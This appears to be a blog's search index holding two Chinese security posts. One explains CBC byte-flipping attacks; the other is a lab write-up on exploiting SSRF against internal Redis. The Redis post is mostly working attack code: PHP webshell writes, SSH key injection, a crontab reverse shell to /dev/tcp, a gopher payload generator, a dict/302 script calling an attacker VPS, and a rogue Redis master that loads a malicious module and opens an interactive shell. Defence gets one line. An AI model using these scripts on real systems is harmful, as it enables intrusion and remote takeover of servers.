<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CBC字节翻转攻击</title>
    <url>/2020/05/08/cbc-reverse/</url>
    <content><![CDATA[<p>在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时为了保证保证即使对相同明文多次加密，也可以得到不同的密文，在第一个块中使用<font color=#008000>IV(初始化向量)</font>。当获取到一组明文与其对应的IV，密文时，即可发起CBC字节翻转攻击。</p>
<a id="more"></a>

<h1 id="0x01-介绍加解密过程"><a href="#0x01-介绍加解密过程" class="headerlink" title="0x01 介绍加解密过程"></a>0x01 介绍加解密过程</h1><h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><p><strong>加密过程如下所示</strong>:</p>
<p><img src="1.png" alt=""></p>
<p>文字版的加密过程：</p>
<ol>
<li>首先将明文分组(常见于以16字节一组)，位数不足进行填充。</li>
<li>生成一个随机的初始化向量(IV)和一个密钥。</li>
<li>将IV和第一组明文异或。</li>
<li>用密钥对异或的结果使用密钥key进行加密，得到密文C1。</li>
<li>使用C1与第二组明文进行异或，然后使用key加密，得到密文C2。</li>
<li>重复4-5,直到最后一组明文。</li>
<li>将IV和加密后的密文拼接在一起，得到最终的密文。</li>
</ol>
<h2 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h2><p><strong>解密过程如下所示</strong>:</p>
<p><img src="2.png" alt=""></p>
<p>文字版的解密过程：</p>
<ol>
<li>从密文中提取出IV，然后将密文分组。</li>
<li>使用密钥key对第一组密文进行解密，然后和IV进行异或得到第一组明文。</li>
<li>使用key对第二组密文进行解密，然后和第一组密文进行异或得到第二组明文。</li>
<li>重复3，直到最后一组密文。</li>
</ol>
<h1 id="0x02-CBC翻转攻击"><a href="#0x02-CBC翻转攻击" class="headerlink" title="0x02 CBC翻转攻击"></a>0x02 CBC翻转攻击</h1><p>在开始介绍其原理前，先来明确一下此攻击所需的前提条件。</p>
<p><strong>前提条件</strong>  </p>
<ol>
<li>知道IV和明文  </li>
<li>应用程序对每次解密出来的明文结果有回显/或者可获取解密明文的结果。 </li>
</ol>
<p><strong>攻击影响</strong>  </p>
<ol>
<li>绕过过滤器  </li>
<li>改变用户权限提升至管理员  </li>
<li>…  </li>
</ol>
<p><strong>CBC翻转攻击原理</strong>:</p>
<p>而CBC翻转攻击与解密过程有关。直观来看，IV会影响到第一组明文的值，而每一组明文的值都会被前一组密文所影响。若第一块密文中的某个字节被改变，则解密出来的第二组明文对应的字节也会被改变。可以从下图看出这整个过程</p>
<p><img src="3.png" alt=""></p>
<p>可以得知，某组密文的改变会影响到其对应的明文块的<font color=#008000>完全改变</font>以及下一个明文块中<font color=#008000>对应位置的改变</font>。</p>
<p><strong>CBC翻转攻击过程</strong></p>
<p>具体的如何改变明文呢？假设要改变第二组明文的值，那么就需要改变对应的第一组密文的值。这里就要利用到异或的原理，若<code>A = B XOR C</code>，那么<font color=#008000><code>A XOR B XOR C = 0</code></font>。所以，<code>0 XOR ANY = ANY</code>。假设ANY为最终我们想要改变的明文字节值。 有如下的计算方式:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P[1] &#x3D; decrept(C[1]) XOR IV</span><br><span class="line">P[2] &#x3D; decrept(C[2]) XOR C[1]</span><br><span class="line"></span><br><span class="line">ANY &#x3D; P[2] XOR decrept(C[2]) XOR C[1] XOR ANY</span><br><span class="line"></span><br><span class="line">ANY &#x3D; decrept(C[2]) XOR (P[2] XOR C[1] XOR ANY)</span><br><span class="line">C&#39;[1] &#x3D; P[2] XOR C[1] XOR ANY</span><br></pre></td></tr></table></figure>

<p>由上述可知，改变的密文字节值的计算方式为<font color=#008000><code>P[2] XOR C[1] XOR ANY</code></font>。python中使用如下方式进行计算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chr(ord(C[<span class="number">1</span>])^ord(P[<span class="number">2</span>])^ord(ANY))</span><br></pre></td></tr></table></figure>

<p>对应的明文确实如期地改变了，但由于密文C[1]的变化，使得明文P[1]的结果也面目全非。而明文P[1]的结果与IV相关，IV为我们可控。因此按照同样的方法改变IV的值，最终就得到了更改后的密文和IV。</p>
<p>对此感兴趣的同学可以<a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">p0’s</a>师傅出得一道题来看看。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://maplege.github.io/2018/11/19/CBC-reverse/" target="_blank" rel="noopener">CBC字节反转攻击原理</a></li>
<li><a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">CBC字节翻转攻击</a></li>
</ul>
]]></content>
      <categories>
        <category>密码攻击</category>
      </categories>
  </entry>
  <entry>
    <title>SSRF-内网Redis Getshell</title>
    <url>/2020/04/17/SSRF-Redis/</url>
    <content><![CDATA[<p>Redis是常见的内网服务，因其默认配置未授权访问或使用弱口令认证，可以导致getshell。这篇文章通过实验的方式介绍了四种内网Redis Getshell的方式。</p>
<a id="more"></a>

<p>经过总结，目前网上对于Redis常见的getshell方式有以下几种:  </p>
<ul>
<li><strong>绝对路径写Webshell</strong></li>
<li><strong>写入ssh公钥</strong></li>
<li><strong>写crontab计划任务反弹shell(针对CentOS)</strong></li>
<li><strong>主从复制(4.0 &lt; Redis)</strong> </li>
</ul>
<p>这篇文章通过实验依次介绍几种方法的使用以及一些脚本，脚本以及此次实验的环境都放在了<a href="https://github.com/ananaskr/Escalation_Database/tree/master/Redis" target="_blank" rel="noopener">github</a>。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>首先介绍一下Redis以及此次实验的相关配置。</p>
<h3 id="Redis介绍"><a href="#Redis介绍" class="headerlink" title="Redis介绍"></a>Redis介绍</h3><p>Redis常用命令有以下几个:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">info                    查看信息  </span><br><span class="line">flushall                删除数据库所有内容  </span><br><span class="line">flushdb                 刷新数据库  </span><br><span class="line">keys *                  查看所有键  </span><br><span class="line">set key value           设置变量  </span><br><span class="line">config set dir dirpath  设置路径  </span><br><span class="line">config set dbfilename   设置文件名  </span><br><span class="line">save                    保存</span><br></pre></td></tr></table></figure>

<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><ul>
<li>docker</li>
<li>centos7.0 + Redis5.0</li>
<li>Python3.6.0</li>
</ul>
<p>php代码放置在docker启动的web服务器上，是一个未经任何防御的SSRF的php代码。如下所示:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">		$link = $_GET[<span class="string">'url'</span>];</span><br><span class="line">		$curlobj = curl_init();</span><br><span class="line">		curl_setopt($curlobj, CURLOPT_POST,<span class="number">0</span>);</span><br><span class="line">		curl_setopt($curlobj, CURLOPT_URL,$link);</span><br><span class="line">		curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">		curl_setopt($curlobj, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">		$result=curl_exec($curlobj);</span><br><span class="line">		<span class="keyword">echo</span> $result;</span><br><span class="line">		curl_close($curlobj);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Redis在另一个镜像中，将Redis绑定在<code>0.0.0.0</code>，因此在宿主机访问<code>curl -v dict://127.0.0.1:6379/info</code>可以成功。但对于docker里的web服务器，<code>docker.for.mac.host.internal</code>为能访问宿主机的地址。即<code>docker.for.mac.host.internal:6379</code>来表示访问内网中的Redis。</p>
<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>基于前面搭建的环境，对这几种利用方式进行了复现。</p>
<h3 id="1-绝对路径写webshell"><a href="#1-绝对路径写webshell" class="headerlink" title="1. 绝对路径写webshell"></a>1. 绝对路径写webshell</h3><p>绝对路径写webshell的方法利用Redis的写权限向web目录中写入webshell，然后通过webshell来getshell。绝对路径写webshell的方法适用于以下场景:</p>
<ol>
<li>开启了web服务</li>
<li>Redis具有对web路径的写权限</li>
<li>知道web目录物理路径</li>
</ol>
<p>以写入php语言的webshell为例，需要在redis中执行以下命令以达到写入webshell的目的。  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;&lt;?php eval($_GET[&quot;cmd&quot;])&#39;;?&gt;&#39;</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>在内网中最常用两种协议<code>dict://</code>与<code>gopher://</code>。其中<code>dict://</code>需要一步步地执行redis getshell的exp，而gopher协议只需要一个url请求即可。在这里使用gopher协议来进行利用。  </p>
<p>Redis服务器与客户端通过RESP协议通信，在利用gopher协议时，需要将需要执行的命令转化为redis RESP协议的格式。这里参考了<a href="https://xz.aliyun.com/t/5665#toc-14" target="_blank" rel="noopener">网上的一个脚本</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp_resp.py</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">"gopher://"</span></span><br><span class="line">ip = <span class="string">"docker.for.mac.host.internal"</span></span><br><span class="line">port = <span class="string">"6379"</span></span><br><span class="line"></span><br><span class="line">shell = <span class="string">"\n\n&lt;?php system($_GET["</span>cmd<span class="string">"]);?&gt;\n\n"</span></span><br><span class="line">filename = <span class="string">"shell.php"</span></span><br><span class="line">path = <span class="string">"/var/www/html"</span></span><br><span class="line">passwd = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">cmd = [	<span class="string">"flushall"</span>,</span><br><span class="line">		<span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">		<span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">		<span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">		<span class="string">"save"</span></span><br><span class="line">		]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line"></span><br><span class="line">payload = protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">	CRLF = <span class="string">"\r\n"</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">	cmd = <span class="string">""</span></span><br><span class="line">	cmd += <span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd += CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">	cmd += CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += quote(redis_format(x))</span><br><span class="line">	print(payload)</span><br></pre></td></tr></table></figure>

<p>运行的结果如下所示:</p>
<p><img src="SSRF-Redis-1.png" alt=""></p>
<p>此payload需放在浏览器中作为get请求的url的参数值，它需要进行一次url编码。即最后的payload为<code>http://127.0.0.1:7777/index.php?url=gopher.....</code></p>
<p>在redis中可以看到执行成功。接下来访问<code>http://127.0.0.1/shell.php?cmd=command</code>即可。</p>
<p><img src="SSRF-Redis-2.png" alt=""></p>
<h3 id="2-写ssh公钥免密登录"><a href="#2-写ssh公钥免密登录" class="headerlink" title="2. 写ssh公钥免密登录"></a>2. 写ssh公钥免密登录</h3><p>写ssh公钥的方法利用的是ssh中提供可利用私钥登录的方式，将公钥写入特定目录下，导致攻击者可以私钥直接登录。写ssh公钥的方法适用于以下场景:</p>
<ol>
<li>开启了ssh服务，且允许免密登录</li>
<li>需要root权限启动redis</li>
</ol>
<p>允许免密登录的配置在<code>etc/sshd/sshd_config</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"></span><br><span class="line">AuthorizedKeysFile	.ssh&#x2F;authorized_keys .ssh&#x2F;authorized_keys2</span><br></pre></td></tr></table></figure>

<p>整个过程分为3步: 1) 生成key pair; 2) 写入ssh key; 3）登录。  </p>
<h4 id="生成key-pair"><a href="#生成key-pair" class="headerlink" title="生成key pair"></a>生成key pair</h4><p>在本地生成公私钥对，进入<code>~/.ssh</code>，执行<code>ssh-keygen -t rsa</code>命令，输入生成的文件名<code>authorized_keys</code>。</p>
<h4 id="写入ssh-key"><a href="#写入ssh-key" class="headerlink" title="写入ssh key"></a>写入ssh key</h4><p>写入ssh key的方式与写入webshell一样，只是改变了写入的目录以及写入的内容。redis运行在什么用户，就能直接以此用户身份进行登录。一般是些写入<code>/root/.ssh</code>目录，也可以写入用户目录，不过需要多一步猜测用户目录。若目录不存在，可利用crontab创建目录，这一方式在下面会介绍到。写入ssh key需要在redis中执行以下命令:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;ssh-rsa xxx...xxx&#39;</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>同理，可用gopher可以完成此次利用。</p>
<h3 id="0x03-写crontab计划反弹shell"><a href="#0x03-写crontab计划反弹shell" class="headerlink" title="0x03 写crontab计划反弹shell"></a>0x03 写crontab计划反弹shell</h3><p>写crontab计划的方式适用于以下场景:</p>
<ol>
<li>系统为Centos。</li>
<li>root权限启动redis。</li>
</ol>
<blockquote>
<p>此方法只能在CentOs上使用，Ubuntu上行不通主要有2点原因。1) 默认Redis写文件后是644的权限，但是Ubuntu要求执行定时任务<code>/var/spool/cron/ceontabs/&lt;username&gt;</code>的权限必须是600，才会执行，而CentOS的定时任务<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行。2) Redis保存RDB会存在乱码，在Ubuntu上会报错，而在CentOS上不会报错。</p>
</blockquote>
<p>执行的命令如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1\n\n&#39;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>前面介绍了使用gopher协议生成payload，此方法也可以使用。但是这里介绍了使用<code>dict://</code>协议来进行利用。这里介绍另一个经典脚本，需要302.php以及shell.php放置在vps上。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="string">'6379'</span></span><br><span class="line"></span><br><span class="line">vul_httpurl = <span class="string">"http://127.0.0.1:7777/index.php?url="</span></span><br><span class="line"></span><br><span class="line">_location = <span class="string">"http://vps:7777/302.php"</span></span><br><span class="line"></span><br><span class="line">shell_location = <span class="string">"http://vps:7777/shell.php"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 flush db</span></span><br><span class="line">scheme = <span class="string">"dict"</span></span><br><span class="line">ip = <span class="string">"docker.for.mac.host.internal"</span></span><br><span class="line">port = <span class="number">6379</span></span><br><span class="line">bhost = <span class="string">"vps"</span></span><br><span class="line">bport = <span class="number">2333</span></span><br><span class="line">_payload = <span class="string">'?scheme=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=flushall'</span>.format(</span><br><span class="line">	scheme = scheme,</span><br><span class="line">	ip = ip,</span><br><span class="line">	port = port</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;location&#125;&#123;payload&#125;'</span>.format(</span><br><span class="line">	vul_httpurl = vul_httpurl,</span><br><span class="line">	location = _location,</span><br><span class="line">	payload = _payload</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">print(exp_uri)</span><br><span class="line">print(len(requests.get(exp_uri).text))</span><br><span class="line"></span><br><span class="line"><span class="comment">#2 set crontab command</span></span><br><span class="line">_payload = <span class="string">'?scheme=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26bhost=&#123;bhost&#125;%26bport=&#123;bport&#125;'</span>.format(</span><br><span class="line">	scheme = scheme,</span><br><span class="line">	ip = ip,</span><br><span class="line">	port = port,</span><br><span class="line">	bhost = bhost,</span><br><span class="line">	bport = bport</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;shell_location&#125;&#123;payload&#125;'</span>.format(</span><br><span class="line">	vul_httpurl = vul_httpurl,</span><br><span class="line">	shell_location = shell_location,</span><br><span class="line">	payload = _payload</span><br><span class="line">	) </span><br><span class="line"></span><br><span class="line">print(exp_uri)</span><br><span class="line">print(requests.get(exp_uri).text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#3 config set dir</span></span><br><span class="line">_payload = <span class="string">'?scheme=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=config:set:dir:/var/spool/cron'</span>.format(</span><br><span class="line">	scheme = scheme,</span><br><span class="line">	ip = ip,</span><br><span class="line">	port = port</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;location&#125;&#123;payload&#125;'</span>.format(</span><br><span class="line">	vul_httpurl = vul_httpurl,</span><br><span class="line">	location = _location,</span><br><span class="line">	payload = _payload</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">print(exp_uri)</span><br><span class="line">print(requests.get(exp_uri).text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#3 config set dbfilename</span></span><br><span class="line">_payload = <span class="string">'?scheme=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=config:set:dbfilename:root'</span>.format(</span><br><span class="line">	scheme = scheme,</span><br><span class="line">	ip = ip,</span><br><span class="line">	port = port</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;location&#125;&#123;payload&#125;'</span>.format(</span><br><span class="line">	vul_httpurl = vul_httpurl,</span><br><span class="line">	location = _location,</span><br><span class="line">	payload = _payload</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">print(exp_uri)</span><br><span class="line">print(requests.get(exp_uri).text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#4 save</span></span><br><span class="line">_payload = <span class="string">'?scheme=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=save'</span>.format(</span><br><span class="line">	scheme = scheme,</span><br><span class="line">	ip = ip,</span><br><span class="line">	port = port</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;location&#125;&#123;payload&#125;'</span>.format(</span><br><span class="line">	vul_httpurl = vul_httpurl,</span><br><span class="line">	location = _location,</span><br><span class="line">	payload = _payload</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">print(exp_uri)</span><br><span class="line">print(requests.get(exp_uri).text)</span><br></pre></td></tr></table></figure>

<p>运行这个脚本并在vps上监听2333端口，等一小会儿就能看到反弹shell的连接。</p>
<blockquote>
<p>注意: 当curl设置了仅允许HTTP/HTTPS，且允许302跳转的情况下，可利用302跳转进行绕过。</p>
</blockquote>
<h3 id="4-主从复制"><a href="#4-主从复制" class="headerlink" title="4. 主从复制"></a>4. 主从复制</h3><p>主从复制这一利用方式是由LC/BC战队队员Pavel Toporkov在zeronights 2018上提出的，<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">PPT</a>。它主要是利用主节点向从节点同步数据时发送恶意RDB文件来实现getshell的。主从复制的RCE适用于以下场景:</p>
<ul>
<li>Redis 4.x以及5.x版本</li>
</ul>
<p>整个的步骤分为4步。</p>
<p>1）<strong>将目标redis设置为slave</strong>  </p>
<p>建立主从关系只需要在从节点操作即可，主节点不用任何操作。在这条命令执行以后，就会向主节点发送请求同步内容。解除主从关系可以执行<code>slaveof no one</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">slaveof ip port</span><br></pre></td></tr></table></figure>

<p>2）<strong>设置redis的数据库文件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;tmp</span><br><span class="line">config set dbfilename exp.so</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在这里最好将当前目录设置为/tmp目录这样的，提高容错率。</p>
</blockquote>
<p>3) <strong>从master接收module</strong><br>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，实现新的Redis命令。Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中。恶意的so文件可参考<a href="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK" target="_blank" rel="noopener">RedisModulesSDK</a>  </p>
<p>在这个过程当中，利用全量复制将master上的RDB文件同步到slave上，从而加载恶意so文件达到RCE的目的。因此，需要以master的身份向slave传输so文件，在弄清楚他们之间流程后，便可伪造一个假的redis服务器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">master   &lt;------ PING  &lt;-----    slave</span><br><span class="line">master   ------&gt; +PONG -----&gt;    slave</span><br><span class="line">master   &lt;--- REPLCONF &lt;-----    slave</span><br><span class="line">master   -------&gt; +OK  -----&gt;    slave</span><br><span class="line">master   &lt;--- REPLCONF &lt;-----    slave</span><br><span class="line">master   -------&gt; +OK  -----&gt;    slave</span><br><span class="line">master   &lt;------ PSYNC &lt;-----    slave</span><br></pre></td></tr></table></figure>

<p>对于我们而言，我们只需要关注在收到slave的请求后，如何回应它，以及在收到PSYNC后发送恶意的so文件。提出该方式的作者编写了一个脚本来发送exp.so文件数据。这里使用了网上的一个脚本。</p>
<p>redis_slave.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CRLF = <span class="string">"\r\n"</span></span><br><span class="line">payload = open(<span class="string">"exp.so"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line">exp_filename = <span class="string">"exp.so"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> CRLF</span><br><span class="line">	<span class="keyword">global</span> payload</span><br><span class="line">	redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">	cmd = <span class="string">""</span></span><br><span class="line">	cmd += <span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd += CRLF+<span class="string">"$"</span>+str(len(x))+CRLF+x</span><br><span class="line">	cmd += CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_connect</span><span class="params">(shost,sport)</span>:</span></span><br><span class="line">	sock = socket.socket()</span><br><span class="line">	sock.connect((shost,sport))</span><br><span class="line">	<span class="keyword">return</span> sock</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(sock,cmd)</span>:</span></span><br><span class="line">	sock.send(redis_format(cmd).encode())</span><br><span class="line">	print(sock.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">interact_shell</span><span class="params">(sock)</span>:</span></span><br><span class="line">	flag = <span class="literal">True</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">while</span> flag:</span><br><span class="line">			shell = input(<span class="string">"\033[1;32;40m[*]\033[0m "</span>)</span><br><span class="line">			shell = shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)</span><br><span class="line">			<span class="keyword">if</span> shell == <span class="string">"exit"</span> <span class="keyword">or</span> shell == <span class="string">"quit"</span>:</span><br><span class="line">				flag = <span class="literal">False</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				send(sock,<span class="string">"system.exec &#123;&#125;"</span>.format(shell))</span><br><span class="line">	<span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RogueServer</span><span class="params">(mport)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> CRLF</span><br><span class="line">	<span class="keyword">global</span> payload</span><br><span class="line">	flag = <span class="literal">True</span></span><br><span class="line">	result = <span class="string">""</span></span><br><span class="line">	sock = socket.socket()</span><br><span class="line">	sock.bind((<span class="string">"0.0.0.0"</span>, mport))</span><br><span class="line">	sock.listen(<span class="number">10</span>)</span><br><span class="line">	clientSock, address = sock.accept()</span><br><span class="line">	<span class="keyword">while</span> flag:</span><br><span class="line">		data = clientSock.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"PING"</span> <span class="keyword">in</span> data:</span><br><span class="line">			result = <span class="string">"+PONG"</span>+CRLF</span><br><span class="line">			clientSock.send(result.encode())</span><br><span class="line">			flag = <span class="literal">True</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="string">"REPLCONF"</span> <span class="keyword">in</span> data:</span><br><span class="line">			result = <span class="string">"+OK"</span>+CRLF</span><br><span class="line">			clientSock.send(result.encode())</span><br><span class="line">			flag = <span class="literal">True</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="string">"PSYNC"</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">"SYNC"</span> <span class="keyword">in</span> data:</span><br><span class="line">			result = <span class="string">"+FULLRESYNC "</span>+<span class="string">"a"</span>*<span class="number">40</span>+<span class="string">" 1"</span>+CRLF</span><br><span class="line">			result += <span class="string">"$"</span>+str(len(payload))+CRLF</span><br><span class="line">			result = result.encode()</span><br><span class="line">			result += payload</span><br><span class="line">			result += CRLF.encode()</span><br><span class="line">			clientSock.send(result)</span><br><span class="line">			flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	mhost = <span class="string">"docker.for.mac.host.internal"</span></span><br><span class="line">	mport = <span class="number">6380</span></span><br><span class="line">	shost = <span class="string">"127.0.0.1"</span></span><br><span class="line">	sport = <span class="number">6379</span></span><br><span class="line">	passwd = <span class="string">""</span></span><br><span class="line">	redis_sock = redis_connect(shost,sport)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> passwd:</span><br><span class="line">		send(redis_sock,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">	send(redis_sock,<span class="string">"SLAVEOF &#123;&#125; &#123;&#125;"</span>.format(mhost,mport))</span><br><span class="line">	send(redis_sock,<span class="string">"config set dbfilename &#123;&#125;"</span>.format(exp_filename))</span><br><span class="line">	time.sleep(<span class="number">2</span>)</span><br><span class="line">	RogueServer(mport)</span><br><span class="line">	send(redis_sock,<span class="string">"MODULE LOAD ./&#123;&#125;"</span>.format(exp_filename))</span><br><span class="line">	interact_shell(redis_sock)</span><br></pre></td></tr></table></figure>

<p>在SSRF的场景中，只能通过url请求访问到内网Redis的情况下，不能直接使用脚本，而是将其中的1）2）4）命令配合其他协议执行，然后在vps上启动Redis_Rogue_Server.py。</p>
<blockquote>
<p>在这个过程中master一定要回复全量复制。因为增量复制时，slave向master发送的runid和offset对应的情况下，会进行数据同步，但不会传输RDB文件。</p>
</blockquote>
<p>4）<strong>加载模块</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module load .&#x2F;exp.so</span><br></pre></td></tr></table></figure>

<p>在加载模块结束后，执行<code>system.exec command</code>即可执行任意命令。</p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul>
<li>在不影响业务的情况下，仅允许HTTP/HTTPS协议，且禁止302跳转。</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li>浅谈Redis中SSRF的利用<a href="https://xz.aliyun.com/t/5665#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665#toc-13</a></li>
<li>Docker提供的指向宿主机的DNS<a href="https://nyan.im/posts/3981.html" target="_blank" rel="noopener">https://nyan.im/posts/3981.html</a></li>
